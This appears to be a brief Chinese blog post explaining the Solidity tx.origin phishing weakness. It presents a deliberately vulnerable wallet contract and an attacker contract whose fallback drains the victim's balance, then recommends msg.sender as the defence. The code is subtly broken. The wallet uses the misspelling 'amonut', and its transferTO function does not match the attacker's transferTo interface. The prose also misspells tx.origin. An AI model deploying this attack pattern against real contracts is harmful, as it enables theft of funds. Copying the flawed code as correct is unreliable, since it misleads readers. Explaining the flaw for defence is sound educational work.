经典了。

---

## 通过tx.origin授权（Authorization Through tx.origin）

 tx.origin(原始交易发起者的外部地址)是一个[全局变量](https://so.csdn.net/so/search?q=全局变量&spm=1001.2101.3001.7020)，它返回发送交易的地址。重要的是千万不要使用tx.origin,因为另一个合约会使用fallback函数来调用你的合约并获得授权，授权地址存储在tx.origin中。

---

通过fallback：

Victim -> Attacker.fallback -> VulnContract.Withdraw

此时 对于 VulnContract.Withdraw来说，msg.sender是Attacker，而 tx.orgin是Victim！

---

 考虑以下案例，首先你部署了一个TxUserWallet合约：

```solidity
// This contract contains a bug - do not use
contract TxUserWallet {
    address owner;
 
    constructor() public {
        owner = msg.sender;
    }
 
    function transferTO(address payable dest, uint amount) public {
        require(tx.origin == owner);
        dest.transfer(amonut);
    }
}
```

 上述我们可以看出TxUserWallet通过tx.origin授权了[transferTO](https://so.csdn.net/so/search?q=transferTO&spm=1001.2101.3001.7020)()。

 然后是攻击合约TxAttackWallet：

```solidity
interface TxUserWallet {
    function transferTo(address payable dest, uint amount) external;
}
 
contract TxAttackWallet {
    address payable owner;
 
    constructor() public {
        owner = msg.sender;
    }
 
    function() external {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }
}
```

 如果有人现在欺骗你向TxAttackWallet合约地址发送[ETH](https://so.csdn.net/so/search?q=ETH&spm=1001.2101.3001.7020)，攻击者可以检查tx.origin找到发送交易的地址来窃取你的资金。

 所以为了防止这种攻击的发生，一般使用msg.sender。